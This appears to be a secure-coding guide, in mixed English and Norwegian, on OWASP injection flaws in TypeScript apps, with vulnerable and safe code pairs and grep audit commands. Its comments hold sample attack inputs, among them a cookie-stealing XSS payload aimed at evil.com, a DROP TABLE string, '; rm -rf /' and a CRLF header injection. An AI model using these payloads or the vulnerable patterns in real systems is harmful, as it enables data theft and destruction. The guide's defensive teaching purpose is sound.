# Injection Security Rules

## OWASP A03: Injection

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.

---

## 1. SQL Injection

### Beskrivelse
Angriper injiserer SQL-kode via brukerinput.

### Sarbare monstre

```typescript
// SARBAR - String interpolation
const userId = req.params.id
const query = `SELECT * FROM users WHERE id = '${userId}'`
await db.query(query)
// Angriper: id = "'; DROP TABLE users; --"

// SARBAR - Template literals i Supabase
const searchTerm = req.query.search
await supabase.from('posts').select(`* WHERE title LIKE '%${searchTerm}%'`)

// SARBAR - RPC med string concat
const name = req.body.name
await supabase.rpc('search_users', { query: `%${name}%` })
```

### Sikre monstre

```typescript
// SIKKERT - Parameterized queries
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('id', userId)  // Automatisk escaped

// SIKKERT - Supabase filter methods
const { data } = await supabase
  .from('posts')
  .select('*')
  .ilike('title', `%${searchTerm}%`)  // Escaped

// SIKKERT - Prepared statements
const { rows } = await pool.query(
  'SELECT * FROM users WHERE id = $1',
  [userId]
)
```

### Grep-sok

```bash
grep -rn '\${.*}.*SELECT\|INSERT\|UPDATE\|DELETE' src/
grep -rn "query\s*\(" src/ | grep -v node_modules
grep -rn "\.raw\(" src/
grep -rn "execute\s*\(" src/
```

---

## 2. Cross-Site Scripting (XSS)

### Beskrivelse
Angriper injiserer JavaScript som kjores i andre brukeres nettlesere.

### Typer

1. **Stored XSS** - Lagret i database, vises til andre brukere
2. **Reflected XSS** - Reflektert via URL-parametere
3. **DOM-based XSS** - Manipulering av DOM direkte

### Sarbare monstre

```typescript
// SARBAR - dangerouslySetInnerHTML
const PostContent = ({ content }: { content: string }) => (
  <div dangerouslySetInnerHTML={{ __html: content }} />
  // Angriper: content = "<script>document.location='evil.com?c='+document.cookie</script>"
)

// SARBAR - innerHTML
document.getElementById('output').innerHTML = userInput

// SARBAR - eval
const code = req.body.code
eval(code)  // ALDRI!

// SARBAR - URL i href uten validering
<a href={userProvidedUrl}>Link</a>
// Angriper: userProvidedUrl = "javascript:alert('XSS')"
```

### Sikre monstre

```typescript
// SIKKERT - React auto-escaping
const PostContent = ({ content }: { content: string }) => (
  <div>{content}</div>  // React escaper automatisk
)

// SIKKERT - Med sanitizer
import DOMPurify from 'dompurify'

const PostContent = ({ content }: { content: string }) => (
  <div
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href']
      })
    }}
  />
)

// SIKKERT - URL validering
const SafeLink = ({ url, children }) => {
  const isValid = url.startsWith('https://') || url.startsWith('/')
  if (!isValid) return null
  return <a href={url}>{children}</a>
}
```

### Grep-sok

```bash
grep -rn "dangerouslySetInnerHTML" src/
grep -rn "innerHTML" src/
grep -rn "eval\(" src/
grep -rn "Function\(" src/
grep -rn "document\.write" src/
grep -rn "\.outerHTML" src/
```

---

## 3. Command Injection

### Beskrivelse
Angriper injiserer shell-kommandoer via brukerinput.

### Sarbare monstre

```typescript
// SARBAR - exec med brukerinput
import { exec } from 'child_process'

const filename = req.body.filename
exec(`convert ${filename} output.png`)
// Angriper: filename = "; rm -rf /"

// SARBAR - Template literal i shell
const command = `grep "${searchTerm}" file.txt`
exec(command)
```

### Sikre monstre

```typescript
// SIKKERT - execFile med array
import { execFile } from 'child_process'

execFile('convert', [filename, 'output.png'], (error, stdout) => {
  // filename er escaped
})

// SIKKERT - Whitelist tillatte verdier
const allowedFormats = ['png', 'jpg', 'gif']
if (!allowedFormats.includes(format)) {
  throw new Error('Invalid format')
}
```

### Grep-sok

```bash
grep -rn "exec\(" src/
grep -rn "spawn\(" src/
grep -rn "child_process" src/
grep -rn "shell.*true" src/
```

---

## 4. NoSQL Injection

### Beskrivelse
Injeksjon i NoSQL-databaser via objekter.

### Sarbare monstre

```typescript
// SARBAR - Objekt fra request direkte
const query = req.body.query
const users = await db.collection('users').find(query)
// Angriper: query = { "$gt": "" }  -> returnerer alle

// SARBAR - $where med brukerinput
const name = req.body.name
await db.collection('users').find({
  $where: `this.name === '${name}'`
})
```

### Sikre monstre

```typescript
// SIKKERT - Eksplisitte felt
const { name, email } = req.body
const users = await db.collection('users').find({
  name: name,
  email: email
})

// SIKKERT - Typesikring
import { z } from 'zod'

const querySchema = z.object({
  name: z.string().max(100),
  age: z.number().int().positive().optional()
})

const validated = querySchema.parse(req.body)
```

---

## 5. LDAP Injection

### Beskrivelse
Injeksjon i LDAP-queries (mindre relevant for denne appen, men nevnes).

### Grep-sok

```bash
grep -rn "ldap" src/
grep -rn "LDAP" src/
```

---

## 6. Header Injection

### Beskrivelse
Injeksjon av HTTP-headers.

### Sarbare monstre

```typescript
// SARBAR - Ukontrollert redirect
const url = req.query.redirect
res.redirect(url)
// Angriper: url = "https://evil.com"

// SARBAR - Header fra brukerinput
const contentType = req.body.contentType
res.setHeader('Content-Type', contentType)
// Angriper: contentType = "text/html\r\nSet-Cookie: admin=true"
```

### Sikre monstre

```typescript
// SIKKERT - Whitelist redirects
const allowedRedirects = ['/home', '/profile', '/settings']
const url = req.query.redirect
if (!allowedRedirects.includes(url)) {
  return res.redirect('/home')
}
res.redirect(url)

// SIKKERT - Validert header
const allowedTypes = ['application/json', 'text/plain']
if (!allowedTypes.includes(contentType)) {
  contentType = 'application/json'
}
res.setHeader('Content-Type', contentType)
```

---

## Input Validation Checklist

For ALLE brukerinput:

- [ ] Lengdebegrensning
- [ ] Type-validering
- [ ] Format-validering (regex)
- [ ] Whitelist tillatte verdier
- [ ] Escape/sanitize for output-kontekst
- [ ] Reject ugyldige input (ikke "fix" dem)

### Zod-eksempel

```typescript
import { z } from 'zod'

const postSchema = z.object({
  title: z.string()
    .min(1, 'Tittel er pakrevd')
    .max(100, 'Tittel for lang')
    .trim(),
  content: z.string()
    .min(1, 'Innhold er pakrevd')
    .max(5000, 'Innhold for langt')
    .trim(),
  category: z.enum(['kultur', 'nyheter', 'sport']),
  isPublic: z.boolean().default(true)
})

// I API route
const result = postSchema.safeParse(await request.json())
if (!result.success) {
  return Response.json(
    { errors: result.error.flatten() },
    { status: 400 }
  )
}
```

---

## Prioritering

| Problem | Alvorlighet | CVSS |
|---------|-------------|------|
| SQL Injection | KRITISK | 9.8 |
| Stored XSS | KRITISK | 9.0 |
| Command Injection | KRITISK | 9.8 |
| Reflected XSS | HOY | 6.1 |
| DOM XSS | HOY | 6.1 |
| NoSQL Injection | HOY | 7.5 |
| Header Injection | MEDIUM | 5.4 |
